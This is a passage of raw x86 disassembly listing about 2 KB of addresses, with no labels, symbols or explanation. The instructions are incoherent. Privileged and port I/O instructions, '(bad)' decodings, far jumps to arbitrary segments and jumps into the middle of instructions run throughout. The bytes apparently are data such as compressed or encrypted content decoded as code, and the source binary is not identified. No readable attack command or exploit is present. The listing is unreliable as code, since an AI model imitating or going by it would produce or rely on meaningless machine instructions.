  40834e:	pushf  
  40834f:	and    eax,0x62d553ff
  408354:	repz or dl,BYTE PTR [ecx-0x6c]
  408358:	cmp    BYTE PTR [edx+0x1d],0x82
  40835c:	in     al,dx
  40835d:	ja     0x40839e
  40835f:	or     DWORD PTR [edx-0x42],0xfffffff2
  408363:	xchg   DWORD PTR [ecx-0x30],ebp
  408366:	and    edx,ebx
  408368:	sub    eax,0xbca058ae
  40836d:	fidivr WORD PTR [esi]
  40836f:	add    BYTE PTR [eax],al
  408371:	pop    eax
  408372:	jp     0x408308
  408374:	push   cs
  408375:	mov    ebx,0x851560f9
  40837a:	and    BYTE PTR [ecx-0x3d6ee4a9],cl
  408380:	xor    ch,BYTE PTR [ebp+0x39]
  408383:	imul   eax,edx,0x105a3dda
  408389:	xchg   esp,eax
  40838a:	pushf  
  40838b:	mov    al,ds:0x8ba87656
  408390:	out    0x76,al
  408392:	xchg   ebx,eax
  408393:	int3   
  408394:	jbe    0x408414
  408396:	sub    cl,ch
  408398:	dec    esi
  408399:	outs   dx,BYTE PTR ds:[esi]
  40839a:	iret   
  40839b:	mov    ds:0x27937abb,eax
  4083a0:	pop    eax
  4083a1:	jmp    0x408344
  4083a3:	mov    ?,edi
  4083a5:	cli    
  4083a6:	lds    edi,FWORD PTR [eax]
  4083a8:	jmp    0x48f2954f
  4083ad:	and    edx,eax
  4083af:	mov    bl,BYTE PTR [eax]
  4083b1:	bound  eax,QWORD PTR [esi-0x77]
  4083b4:	js     0x40838b
  4083b6:	xor    al,0xa7
  4083b8:	ja     0x2bfc612c
  4083be:	fmul   QWORD PTR [esi]
  4083c0:	mov    ch,0xa3
  4083c2:	push   esi
  4083c3:	daa    
  4083c4:	xchg   BYTE PTR [esi+0x3c11324b],dl
  4083ca:	ss nop
  4083cc:	dec    edx
  4083cd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4083ce:	xor    al,0xad
  4083d0:	xor    BYTE PTR [edi+ebp*4-0x38b4d83f],ah
  4083d7:	mov    ecx,0xa8b777d
  4083dc:	sahf   
  4083dd:	sub    DWORD PTR [eax-0x36],esi
  4083e0:	fld    TBYTE PTR [esi]
  4083e2:	in     eax,0xa9
  4083e4:	xchg   esp,eax
  4083e5:	xor    ecx,DWORD PTR [ecx+0x10]
  4083e8:	dec    edi
  4083e9:	dec    esp
  4083ea:	mov    ?,WORD PTR [edi-0x5c]
  4083ed:	jecxz  0x40843c
  4083ef:	mov    BYTE PTR [ecx],dh
  4083f1:	sbb    ebp,DWORD PTR [ebx]
  4083f3:	ja     0x4083a0
  4083f5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4083f6:	add    ebp,DWORD PTR [ebp-0x68]
  4083f9:	inc    ecx
  4083fa:	lods   al,BYTE PTR ds:[esi]
  4083fb:	fs mov bh,0x6e
  4083fe:	cmc    
  4083ff:	arpl   WORD PTR [esi-0x1ed3f36f],si
  408405:	hlt    
  408406:	fstp   QWORD PTR [edx]
  408408:	inc    edx
  408409:	pop    ebp
  40840a:	jo     0x408437
  40840c:	(bad)  
  40840e:	stos   BYTE PTR es:[edi],al
  40840f:	fxch   st(4)
  408411:	fisubr DWORD PTR [esi-0x32]
  408414:	mov    eax,0xb6580608
  408419:	fcomp  DWORD PTR ds:0xbc736806
  40841f:	push   ds
  408420:	pop    eax
  408421:	jg     0x4083b3
  408423:	jmp    0x229d:0xa2334be
  40842a:	xchg   ebx,eax
  40842b:	pop    edx
  40842c:	and    BYTE PTR [esi+0x23],ch
  40842f:	int    0x3a
  408431:	test   al,0x9
  408433:	or     dl,BYTE PTR [edx-0x78a0a22c]
  408439:	leavew 
  40843b:	cmp    bl,0xe3
  40843e:	test   BYTE PTR [ebx-0x70846007],al
  408444:	inc    edx
  408445:	mul    DWORD PTR [edi+eax*1-0x34]
  408449:	pushf  
  40844a:	dec    ebx
  40844b:	arpl   WORD PTR [ebp+0x29066349],bx
  408451:	xchg   ebx,eax
  408452:	pop    ss
  408453:	or     ebp,DWORD PTR [edi-0x5a]
  408456:	and    eax,DWORD PTR [edx-0x4e]
  408459:	mov    WORD PTR [esp+edi*2-0x71],ss
  40845d:	push   esi
  40845e:	mov    cr0,eax
  408461:	iret   
  408462:	fld    QWORD PTR [ebp-0x10]
  408465:	pop    es
  408466:	test   eax,0xd43d0f3
  40846b:	shl    DWORD PTR [edi+0x2797671e],cl
  408471:	sub    dl,BYTE PTR ds:0xb865e255
  408477:	xor    al,0x60
  408479:	fidivr DWORD PTR [ebp+0x4c345b36]
  40847f:	add    bh,BYTE PTR [eax-0x47]
  408482:	mov    esi,0x7e00d075
  408487:	aam    0xe3
  408489:	or     eax,0xfd9e6ca9
  40848e:	jmp    0xf8eb4d64
  408493:	stos   BYTE PTR es:[edi],al
  408494:	cmp    ecx,DWORD PTR [edi]
  408496:	fstp   QWORD PTR [edi]
  408498:	xor    dh,BYTE PTR [edi]
  40849a:	mov    al,ds:0x5a9abbf4
  40849f:	dec    edx
  4084a0:	call   0x9e3b:0xf30c3dc1
  4084a7:	xchg   ebp,eax
  4084a8:	pop    ecx
  4084a9:	pop    ss
  4084aa:	sbb    dl,bl
  4084ac:	int    0xf6
  4084ae:	(bad)  
  4084af:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4084b0:	imul   ecx,DWORD PTR [ebx],0xd4537a19
  4084b6:	int    0x32
  4084b8:	std    
  4084b9:	cmc    
  4084ba:	fcom   QWORD PTR [edx]
  4084bc:	push   eax
  4084bd:	les    ecx,FWORD PTR [eax-0x4bff2c6b]
  4084c3:	mov    edx,0x2350886e
  4084c8:	sub    DWORD PTR [ecx+0x18364e34],ecx
  4084ce:	mov    ds:0x16710f07,eax
  4084d3:	jne    0x4084a1
  4084d5:	jge    0x4084ff
  4084d7:	bound  edx,QWORD PTR [ebx-0x495e5430]
  4084dd:	aas    
  4084de:	clc    
  4084df:	jmp    0x40855a
  4084e1:	repz aaa 
  4084e3:	pop    dx
  4084e5:	mov    ebx,0x99e26846
  4084ea:	xor    eax,0xbc2809ea
  4084ef:	dec    edx
  4084f0:	cmp    ecx,DWORD PTR [ecx+eiz*4-0x23]
  4084f4:	call   0x63d2779
  4084f9:	es push ebx
  4084fb:	sar    BYTE PTR [ebx-0x5bb378a4],0x3d
  408502:	pop    ecx
  408503:	fwait
  408504:	ss loop 0x40856a
  408507:	add    eax,0x38c746b
  40850c:	pop    ds
  40850d:	test   DWORD PTR [ecx],esp
  40850f:	jge    0x408498
  408511:	enter  0xe9b2,0xfd
  408515:	sub    WORD PTR [ebx+0x33b85ffe],0xffba
  40851d:	fwait
  40851e:	adc    DWORD PTR [ebp-0x6f],eax
  408521:	pop    edx
  408522:	xor    BYTE PTR [eax-0x4c412e4d],ah
  408528:	inc    esp
  408529:	rcl    DWORD PTR fs:[ebp-0x7d905dc0],0x78
  408531:	enter  0xe2ea,0x31
  408535:	ficom  DWORD PTR [edx]
  408537:	mov    ah,0xde
  408539:	xor    eax,0x68c10ffb
  40853f:	adc    ecx,DWORD PTR [ecx+0x54]
  408542:	adc    bl,ah
  408544:	stc    
  408545:	inc    ebp
  408546:	jp     0x40851a
  408548:	imul   ebx,esp,0xffffff84
  40854b:	lds    ebp,FWORD PTR [esi]
  40854d:	scas   al,BYTE PTR es:[edi]
  40854e:	pop    esi
  40854f:	sub    BYTE PTR [edi],ch
  408551:	sub    ecx,esi
  408553:	into   
  408554:	sub    eax,DWORD PTR gs:[ebx-0x144f1004]
  40855b:	sti    
  40855c:	jo     0x408510
  40855e:	ja     0x408570
  408560:	(bad)  
  408561:	jae    0x408512
  408563:	pop    ss
  408564:	inc    esp
  408565:	ret    0x57a1
  408568:	call   0x8fc756a7
  40856d:	push   0x65
  40856f:	cmp    eax,0xe6b33441
  408574:	ins    BYTE PTR es:[edi],dx
  408575:	clc    
  408576:	or     DWORD PTR [ebp-0x75],edx
  408579:	pop    edx
  40857a:	adc    esp,DWORD PTR [bp+0x1c99]
  40857f:	push   0x88cc2fa7
  408584:	sbb    BYTE PTR [eax-0x6fed4964],cl
  40858a:	mov    esi,0x56d2bc86
  40858f:	jl     0x4085ea
  408591:	icebp  
  408592:	jmp    0x270f:0x3ccb02dd
  408599:	push   edi
  40859a:	call   DWORD PTR [ebx]
  40859c:	push   esp
  40859d:	(bad)
  4085a1:	outs   dx,DWORD PTR ds:[esi]
  4085a2:	pop    ebp
  4085a3:	mov    WORD PTR [eax-0x50],ss
  4085a6:	or     DWORD PTR [edx-0x6735de1b],esp
  4085ac:	push   0x4f684575
  4085b1:	cmp    BYTE PTR [edx+0x309c6912],ch
  4085b7:	jl     0x4085c1
  4085b9:	push   esp
  4085ba:	lds    eax,FWORD PTR [ebx-0x51]
  4085bd:	jno    0x408630
  4085bf:	cmp    DWORD PTR [eax+0x3b9d3908],eax
  4085c5:	pop    ebp
  4085c6:	clc    
  4085c7:	jecxz  0x408578
  4085c9:	pop    esi
  4085ca:	fld    st(2)
  4085cc:	inc    edi
  4085cd:	push   ds
  4085ce:	jb     0x40857b
  4085d0:	lahf   
  4085d1:	lea    ebp,[esi+eiz*4+0x3c]
  4085d5:	or     al,BYTE PTR ds:0xa1da7278
  4085db:	bound  ebx,QWORD PTR [edx+0x64]
  4085de:	dec    esi
  4085df:	adc    al,0x71
  4085e1:	jnp    0x40861f
  4085e3:	idiv   BYTE PTR [edi+ebx*8+0x710ef558]
  4085ea:	and    DWORD PTR ds:0x581551e2,ebx
  4085f0:	push   esi
  4085f1:	sub    ah,BYTE PTR [eax+0x59]
  4085f4:	mov    edx,0xbf585178
  4085f9:	mov    WORD PTR [edx+0x25a2dd67],gs
  4085ff:	mov    ecx,DWORD PTR [edi+esi*2]
  408602:	jne    0x4085a4
  408604:	dec    ebx
  408605:	mov    bh,0xab
  408607:	xchg   ecx,eax
  408608:	mov    ebp,0x5d5a9c73
  40860d:	sbb    dl,BYTE PTR [edx]
  40860f:	adc    eax,0x37bbdc99
  408614:	xor    al,0x87
  408616:	cli    
  408617:	cmc    
  408618:	sbb    ch,bl
  40861a:	jge    0x408677
  40861c:	ror    BYTE PTR [esi-0x5],cl
  40861f:	aaa    
  408620:	mov    al,ds:0x1bc70935
  408625:	mov    ds:0x76d3b24,al
  40862a:	imul   esp,DWORD PTR [edx-0x57490e2],0x3dae6ee5
  408634:	imul   eax,DWORD PTR [ebx],0xffffffc8
  408637:	or     DWORD PTR [edx+0xff67f62],esi
  40863d:	add    eax,0x950f2542
  408642:	mov    edx,0x2fcb04f8
  408647:	lea    esp,[esi-0xb]
  40864a:	adc    DWORD PTR [ebx+0x51a81ac8],ecx
  408650:	retf   0xbdbc
  408653:	loop   0x4086bb
  408655:	jp     0x4086c6
  408657:	lahf   
  408658:	sbb    DWORD PTR [ecx-0x657080dd],0xe7f3f5b
  408662:	add    BYTE PTR [ebx+0x2b7929f3],cl
  408668:	arpl   WORD PTR [eax],ax
  40866a:	test   al,0x62
  40866c:	dec    edx
  40866d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40866e:	call   0x4d1829
  408673:	arpl   WORD PTR [ebp+0x54bfbe7],si
  408679:	stos   BYTE PTR es:[edi],al
  40867a:	dec    edi
  40867b:	cwde   
  40867c:	js     0x408606
  40867e:	or     eax,0x1ea80d56
  408683:	push   eax
  408684:	inc    ebx
  408685:	xor    eax,eax
  408687:	outs   dx,DWORD PTR ds:[esi]
  408688:	addr16 mov bl,0x34
  40868b:	mov    ebx,0x2dc2d3fd
  408690:	jb     0x40864b
  408692:	aam    0x8f
  408694:	call   0xa826:0xa84ce7bc
  40869b:	xchg   DWORD PTR [edi+0x1],ecx
  40869e:	jne    0x4086eb
  4086a0:	xchg   ebx,eax
  4086a1:	in     eax,0xa2
  4086a3:	shl    al,1
  4086a5:	push   ebp
  4086a6:	mov    ds:0x97e56d20,eax
  4086ab:	xchg   edx,eax
  4086ac:	mov    DWORD PTR [eax],edi
  4086ae:	pop    ss
  4086af:	int3   
  4086b0:	mov    WORD PTR [esi-0x42],cs
  4086b3:	in     eax,0x60
  4086b5:	mov    edx,0x72bed96d
  4086ba:	cwde   
  4086bb:	push   0xffffffe2
  4086bd:	adc    cl,al
  4086bf:	xchg   edx,eax
  4086c0:	repz (bad) 
  4086c2:	test   BYTE PTR [ecx-0x6bbfcc77],0x65
  4086c9:	hlt    
  4086ca:	arpl   WORD PTR [ebp+0x19],bx
  4086cd:	das    
  4086ce:	mul    BYTE PTR [eax-0x21]
  4086d1:	test   BYTE PTR [esi+0x6d],cl
  4086d4:	addr16 (bad) 
  4086d6:	out    dx,eax
  4086d7:	xor    BYTE PTR [edx+0x59],al
  4086da:	jge    0x40870d
  4086dc:	ret    0x3fdd
  4086df:	ins    BYTE PTR es:[edi],dx
  4086e0:	imul   edi,DWORD PTR [ebx-0x25],0x3f
  4086e4:	pop    edx
  4086e5:	aad    0x37
  4086e7:	jno    0x40866c
  4086e9:	inc    ebp
  4086ea:	rep ins DWORD PTR es:[edi],dx
  4086ec:	xor    DWORD PTR [edx],esp
  4086ee:	xor    al,0x13
  4086f0:	mov    bl,0xad
  4086f2:	sbb    dh,BYTE PTR [ebp+0x14]
  4086f5:	ret    
  4086f6:	add    ah,dh
  4086f8:	call   0x85c8:0xb7050f01
  4086ff:	dec    eax
  408700:	xchg   ebx,eax
  408701:	mov    ebp,0x8c59866e
  408706:	je     0x408700
  408708:	or     al,0x1a
  40870a:	cdq    
  40870b:	jae    0x408698
  40870d:	test   al,0x73
  40870f:	dec    eax
  408710:	in     eax,0x4c
  408712:	mov    ds:0x7b9878ad,eax
  408717:	fisub  WORD PTR [edi+ecx*8-0x75]
  40871b:	dec    ecx
  40871c:	stc    
  40871d:	dec    ebp
  40871e:	sub    al,0xa0
  408720:	lock sbb ebx,DWORD PTR [esi-0x4e]
  408724:	push   esp
  408725:	push   ds
  408726:	mov    esi,0xf34c9904
  40872b:	sub    DWORD PTR [edx],0x553cb8af
  408731:	dec    ebx
  408732:	out    dx,al
  408733:	out    dx,al
  408734:	adc    al,0xe8
  408736:	dec    edx
  408737:	or     BYTE PTR [ebx],dl
  408739:	lock xchg ebp,eax
  40873b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40873c:	neg    al
  40873e:	sub    al,0x2e
  408740:	shr    DWORD PTR [edx+0x695d8545],0x80
  408747:	(bad)  
  408748:	lock (bad) 
  40874a:	(bad)  
  40874b:	cdq    
  40874c:	push   0x81f003f0
  408751:	and    eax,0x8608d9b4
  408756:	bound  esi,QWORD PTR [edi+0x6fc0216c]
  40875c:	adc    DWORD PTR [edi],ebp
  40875e:	nop
  40875f:	mov    cl,0x6
  408761:	outs   dx,DWORD PTR ds:[esi]
  408762:	or     bl,ah
  408764:	ret    0x441e
  408767:	scas   eax,DWORD PTR es:[edi]
  408768:	addr16 aaa 
  40876a:	jmp    0x408739
  40876c:	mov    esi,0xf2866ae4
  408771:	or     bh,BYTE PTR [ebx-0x72bb83fe]
  408777:	sbb    eax,0x7ba34299
  40877c:	enter  0x68e9,0x12
  408780:	dec    edi
  408781:	and    BYTE PTR [edx+0x77],al
  408784:	out    dx,al
  408785:	push   0x3f
  408787:	dec    edi
  408788:	lods   al,BYTE PTR ds:[esi]
  408789:	(bad)  
  40878a:	scas   al,BYTE PTR es:[edi]
  40878b:	ror    BYTE PTR [ecx],1
  40878d:	int    0x8
  40878f:	hlt    
  408790:	jmp    0x3a43:0xbdc2cffe
  408797:	aas    
  408798:	and    BYTE PTR [edi+0x66],0xd6
  40879c:	mov    ebx,0x49eeb5a1
  4087a1:	mov    al,0x9b
  4087a3:	adc    ch,BYTE PTR [edi+0x75]
  4087a6:	jmp    0x40875a
  4087a8:	xchg   esp,eax
  4087a9:	retf   
  4087aa:	stc    
  4087ab:	xchg   ebp,eax
  4087ac:	jae    0x408756
  4087ae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4087af:	cmp    dl,BYTE PTR [edx+0x6a]
  4087b2:	xchg   esp,eax
  4087b3:	adc    BYTE PTR [bp-0x70],ah
  4087b7:	cld    
  4087b8:	sahf   
  4087b9:	(bad)  [edi]
  4087bb:	pop    eax
  4087bc:	mov    ebx,0xa8c52889
  4087c1:	int    0x9b
  4087c3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4087c4:	xchg   edi,eax
  4087c5:	jne    0x408787
  4087c7:	and    eax,ebx
  4087c9:	hlt    
  4087ca:	int    0x68
  4087cc:	aas    
  4087cd:	popa   
  4087ce:	std    
  4087cf:	enter  0x3cd,0x9a
  4087d3:	add    al,0xe9
  4087d5:	push   cs
  4087d6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4087d7:	mov    al,0xbe
  4087d9:	out    dx,eax
  4087da:	and    DWORD PTR [edi+0x29183f63],ecx
  4087e0:	fdivr  st(4),st
  4087e2:	std    
  4087e3:	repnz mov dh,0x85
  4087e6:	adc    eax,0xb237db17
  4087eb:	or     bh,ah
  4087ed:	mov    ecx,0x56e3ce94
  4087f2:	dec    ebx
  4087f3:	xor    BYTE PTR [edx+0x3e798f25],ah
  4087f9:	cmp    bh,BYTE PTR [ecx+0x61]
  4087fc:	cs sub al,0xbe
  4087ff:	fstp   DWORD PTR [ebp+0x440640]
  408805:	das    
  408806:	iret   
  408807:	push   edi
  408808:	mov    bl,0x8e
  40880a:	dec    eax
  40880b:	repz or al,0xa4
  40880e:	stos   BYTE PTR es:[edi],al
  40880f:	lahf   
  408810:	adc    edi,DWORD PTR [ecx+0x5f81f760]
  408816:	dec    esi
  408817:	cmc    
  408818:	mul    DWORD PTR [edi-0x6c281644]
  40881e:	loope  0x40887b
  408820:	inc    ecx
  408821:	dec    ebx
  408822:	xchg   ecx,eax
  408823:	(bad)  
  408825:	std    
  408826:	mov    BYTE PTR [ebx],ah
  408828:	outs   dx,DWORD PTR ds:[esi]
  408829:	shl    DWORD PTR [ebp+0x28],cl
  40882c:	in     eax,dx
  40882d:	test   DWORD PTR [ecx+eax*1+0x7a],esp
  408831:	mov    eax,ds:0xab5336af
  408836:	xor    eax,0x240c996a
  40883b:	inc    ecx
  40883c:	test   DWORD PTR [eax-0x67],edx
  40883f:	pusha  
  408840:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408841:	push   cs
  408842:	adc    ebp,esi
  408844:	call   0x4268:0x3bb9d7b5
  40884b:	rol    BYTE PTR [esi+0x75],cl
  40884e:	xchg   edi,eax
  40884f:	lahf   
  408850:	mov    bh,0xe8
  408852:	mov    ch,0x5d
  408854:	or     DWORD PTR ds:0x5db08ca0,eax
  40885a:	xchg   ebp,eax
  40885b:	pushf  
  40885c:	cmp    ecx,0x8e4dcfb5
  408862:	push   edx
  408863:	push   0x39
  408865:	mov    al,0x6
  408867:	shr    BYTE PTR [esi-0xa4186bb],cl
  40886d:	mov    eax,0x361d83e0
  408872:	sub    DWORD PTR [ebp-0x5a],ebp
  408875:	mov    ebp,ds
  408877:	cld    
  408878:	icebp  
  408879:	xchg   esp,eax
  40887a:	mov    esi,0x3a9e3bf7
  40887f:	sbb    ah,BYTE PTR [eax+0x32]
  408882:	mov    al,ds:0x50b11f35
  408887:	js     0x4088d1
  408889:	retf   
  40888a:	sub    eax,0x29dda811
  40888f:	cmp    eax,0x5d3cfdf1
  408894:	in     al,0x28
  408896:	jmp    0x408911
  408898:	xchg   ebp,eax
  408899:	adc    al,BYTE PTR [eax]
  40889b:	pop    ss
  40889c:	pop    ebx
  40889d:	leave  
  40889e:	in     eax,0xc5
  4088a0:	bound  esi,QWORD PTR [eax-0x1b]
  4088a3:	ins    BYTE PTR es:[edi],dx
  4088a4:	pop    ecx
  4088a5:	loop   0x40885d
  4088a7:	dec    ebp
  4088a8:	fmulp  st(1),st
  4088aa:	sbb    DWORD PTR [esi+0x46422169],ebx
  4088b0:	mov    ecx,0xe9779ef3
  4088b5:	sbb    ah,BYTE PTR ds:0x8ffd24db
  4088bb:	gs sbb eax,0x37874ad4
  4088c1:	sbb    edi,0x56
  4088c4:	fwait
  4088c5:	in     eax,dx
  4088c6:	jge    0x408868
  4088c8:	repz int3 
  4088ca:	dec    ebx
  4088cb:	mov    ah,0x1e
  4088cd:	dec    edi
  4088ce:	jle    0x4088b9
  4088d0:	jmp    FWORD PTR [ebx+0xc1c4822]
  4088d6:	dec    eax
  4088d7:	into   
  4088d8:	cmp    eax,0xddf0d535
  4088dd:	fs je  0x408913
  4088e0:	imul   edx,DWORD PTR [ebx+0x44840243],0x24fdda6b
  4088ea:	mov    ?,WORD PTR [ecx-0x7d6fd896]
  4088f0:	adc    DWORD PTR [eax+edx*1+0x15],esp
  4088f4:	aad    0xd2
  4088f6:	jb     0x408955
  4088f8:	loopne 0x4088a8
  4088fa:	iret   
  4088fb:	fld    DWORD PTR [ecx+0x3b56bb89]
  408901:	xor    DWORD PTR [ebp+0x2b],esp
  408904:	pop    edx
  408905:	icebp  
  408906:	popa   
  408907:	std    
  408908:	mov    eax,0xf314e0b9
  40890d:	inc    esi
  40890e:	(bad)  
  40890f:	lahf   
  408910:	in     al,dx
  408911:	jge    0x4088a2
  408913:	test   DWORD PTR [ecx+0x4c5deadd],0xefd68270
  40891d:	fisttp DWORD PTR [edi-0x1b]
  408920:	pop    ebx
  408921:	jmp    0xde508a0b
  408926:	inc    esi
  408927:	or     DWORD PTR [ebp-0x4537d6a5],esp
  40892d:	push   ds
  40892e:	add    al,0x7d
  408930:	test   ebp,edi
  408932:	aaa    
  408933:	enter  0x585c,0xc3
  408937:	xchg   ebp,eax
  408938:	jmp    ecx
  40893a:	add    ecx,DWORD PTR [edx+0x13817894]
  408940:	push   eax
  408941:	adc    al,0x81
  408943:	mov    dh,0xef
  408945:	sub    dl,BYTE PTR [edi+0x2b]
  408948:	sbb    DWORD PTR [eax+0x32b2d29],ecx
  40894e:	mov    ecx,0x1d1f79e6
  408953:	ja     0x408950
  408955:	lahf   
  408956:	rcl    DWORD PTR [edi+edi*2-0x70],0x29
  40895b:	retf   
  40895c:	or     eax,0x6d3cf5f0
  408961:	cld    
  408962:	inc    edx
  408963:	mov    BYTE PTR [edi],0x66
  408966:	shr    BYTE PTR [ebp+0x3d],0xe2
  40896a:	add    eax,0x225f622c
  40896f:	es push ebx
  408971:	fsub   DWORD PTR [edi-0x5b]
  408974:	cmp    al,ch
  408976:	call   0x643:0x926272de
  40897d:	or     BYTE PTR [ecx],0x35
  408980:	mov    ebx,0x9d349792
  408985:	sbb    al,0x5c
  408987:	sbb    esi,DWORD PTR [ebp-0xef1f332]
  40898d:	jbe    0x4089eb
  40898f:	out    0x29,eax
  408991:	mov    dl,0xaa
  408993:	xchg   DWORD PTR [eax-0x21607f9b],edx
  408999:	cwde   
  40899a:	pop    es
  40899b:	sub    ebp,ebp
  40899d:	jns    0x4089a6
  40899f:	mov    ds,WORD PTR [ecx]
  4089a1:	add    BYTE PTR [edi+0x41],al
  4089a4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4089a5:	mov    ecx,0x10ef8522
  4089aa:	dec    edx
  4089ab:	fidivr WORD PTR [edx-0x72]
  4089ae:	fisub  DWORD PTR [edx]
  4089b0:	add    BYTE PTR [edi-0x45],0x99
  4089b4:	push   edi
  4089b5:	out    0x4f,al
  4089b7:	in     eax,dx
  4089b8:	je     0x408a0f
  4089ba:	xchg   edx,eax
  4089bb:	xor    eax,0xb438c49
  4089c0:	dec    ecx
  4089c1:	push   ss
  4089c2:	cmp    BYTE PTR [edi+0x196e76f8],bh
  4089c8:	push   ebx
  4089c9:	mov    bl,0x2e
  4089cb:	rcl    DWORD PTR [eax],1
  4089cd:	sub    cl,0xc2
  4089d0:	jle    0x408a26
  4089d2:	aas    
  4089d3:	adc    bh,BYTE PTR [ebp-0x3f]
  4089d6:	stos   DWORD PTR es:[edi],eax
  4089d7:	fist   DWORD PTR [esi+0x4a9873e4]
  4089dd:	popf   
  4089de:	int    0xe5
  4089e0:	(bad)  
  4089e1:	out    0x7b,eax
  4089e3:	loopne 0x4089b8
  4089e5:	xchg   edi,eax
  4089e6:	mov    edx,0xe8bd853
  4089eb:	jnp    0x4089d4
  4089ed:	sbb    al,0x1e
  4089ef:	xchg   ecx,eax
  4089f0:	xchg   DWORD PTR [ebx],esi
  4089f2:	mov    WORD PTR ds:0x2b2b95de,cs
  4089f8:	enter  0xa2d2,0x37
  4089fc:	cmp    cl,bh
  4089fe:	adc    al,0x69
  408a00:	rcr    DWORD PTR [edi],1
  408a02:	dec    ecx
  408a03:	mov    DWORD PTR [edi-0x5cc4691],ecx
  408a09:	fcom   DWORD PTR [edx+ebp*2]
  408a0c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408a0d:	fstp   DWORD PTR [esi-0x45fa6a2a]
  408a13:	test   al,0x3c
  408a15:	popfw  
  408a17:	repz mov ebp,0xe0560cf7
  408a1d:	pop    ebp
  408a1e:	int    0x69
  408a20:	test   al,0x72
  408a22:	imul   edi,esp,0x7f
  408a25:	jmp    0xa4d5:0xc1027277
  408a2c:	sbb    ebx,DWORD PTR [ebp+0x2e]
  408a2f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408a30:	and    BYTE PTR [ebx+0x35],dl
  408a33:	mov    cl,0x9
  408a35:	nop
  408a36:	out    0xa7,eax
  408a38:	fwait
  408a39:	add    cl,BYTE PTR [edx]
  408a3b:	shl    ecx,0x19
  408a3e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408a3f:	mov    ebp,0xf40ed432
  408a44:	wrmsr  
  408a46:	shr    BYTE PTR [ebx+0x4e3a92f7],1
  408a4c:	imul   edi,eax,0xabbc6d7
  408a52:	pop    ebx
  408a53:	mov    esp,0x56ee6f42
  408a58:	fild   DWORD PTR [ecx]
  408a5a:	out    dx,eax
  408a5b:	sahf   
  408a5c:	xchg   edx,eax
  408a5d:	jnp    0x4089f1
  408a5f:	sbb    edx,DWORD PTR ds:0x3fa73b5f
  408a65:	jl     0x408a01
  408a67:	shl    BYTE PTR [esi-0x31088f91],0x98
  408a6e:	inc    esp
  408a6f:	push   ds
  408a70:	jmp    0x138:0xf25e03d
  408a77:	loope  0x408ae0
  408a79:	test   eax,0xa44334b7
  408a7e:	out    0x43,eax
  408a80:	jle    0x408a6b
  408a82:	mov    dh,0xcf
  408a84:	mov    ds:0x6d425378,eax
  408a89:	sub    BYTE PTR [ecx+0x4b],dl
  408a8c:	(bad)  
  408a8d:	pop    esi
  408a8e:	fcomp  DWORD PTR [esi]
  408a90:	add    DWORD PTR [eax-0x547f8044],0x5b
  408a97:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408a98:	lahf   
  408a99:	stos   BYTE PTR es:[edi],al
  408a9a:	scas   eax,DWORD PTR es:[edi]
  408a9b:	xchg   ebx,eax
  408a9c:	xor    esp,DWORD PTR [esi+0x3bc888f]
  408aa2:	ja     0x408aea
  408aa4:	xor    DWORD PTR [esi-0xbd8f240],0x54446adb
  408aae:	jbe    0x408af4
  408ab0:	xor    al,0x2b
  408ab2:	jne    0x408ac1
  408ab4:	xchg   ecx,eax
  408ab5:	adc    bl,BYTE PTR [eax]
  408ab7:	mov    bl,0x80
  408ab9:	mov    ds:0xf51f16a4,al
  408abe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408abf:	dec    esi
  408ac0:	pop    esi
  408ac1:	and    DWORD PTR [edx+0x7e],0x3e
  408ac5:	out    dx,eax
  408ac6:	or     eax,0x4b91d8dc
  408acb:	out    0xa8,eax
  408acd:	push   ds
  408ace:	dec    eax
  408acf:	and    DWORD PTR [esi-0xd],0xef86db5
  408ad6:	fldcw  WORD PTR [ecx+edx*8-0x29f678b2]
  408add:	fld    DWORD PTR [ecx-0x11]
  408ae0:	jecxz  0x408ae7
  408ae2:	jecxz  0x408b22
  408ae4:	stc    
  408ae5:	outs   dx,BYTE PTR ds:[esi]
  408ae6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408ae7:	jo     0x408a7a
  408ae9:	sub    al,0x67
  408aeb:	mov    eax,0xf48f5df9
  408af0:	pop    edx
  408af1:	jne    0x408a94
  408af3:	shr    DWORD PTR [esi],0xaa
  408af6:	clc    
  408af7:	add    al,0x1a
  408af9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408afa:	mov    cl,0xa7
  408afc:	mov    ds:0x990307d6,al
  408b01:	push   0x5d
  408b03:	(bad)  
  408b05:	fucomip st,st(7)
  408b07:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408b08:	out    0x67,eax
  408b0a:	fnstsw WORD PTR [edi-0x20]
  408b0d:	push   ebx
  408b0e:	lds    ebx,FWORD PTR [ebp+0x6afd32ec]
  408b14:	inc    ecx
  408b15:	in     al,dx
  408b16:	sub    BYTE PTR [edi-0x80],bh
  408b19:	push   es
  408b1a:	sbb    eax,DWORD PTR [esi+ecx*8]
  408b1d:	sbb    al,0xe0
  408b1f:	add    BYTE PTR fs:[edi],ah
  408b22:	lock jl 0x408b23
  408b25:	mov    bl,0x12
  408b27:	push   ecx
  408b28:	das    
  408b29:	ja     0x408b6b
  408b2b:	jbe    0x408b92
  408b2d:	call   0x1b01:0xdee386d8
  408b34:	pusha  
  408b35:	jmp    0x57751b51
  408b3a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408b3b:	or     eax,0x74229cc6
  408b40:	cmp    al,0x8d
  408b42:	sbb    edx,ebx
  408b44:	sub    DWORD PTR ds:0x1b41cc04,esi
  408b4a:	mov    ecx,0x28fcb334
  408b4f:	neg    DWORD PTR [ebx-0x2b1d384d]
  408b55:	out    dx,al
  408b56:	stc    
  408b57:	std    
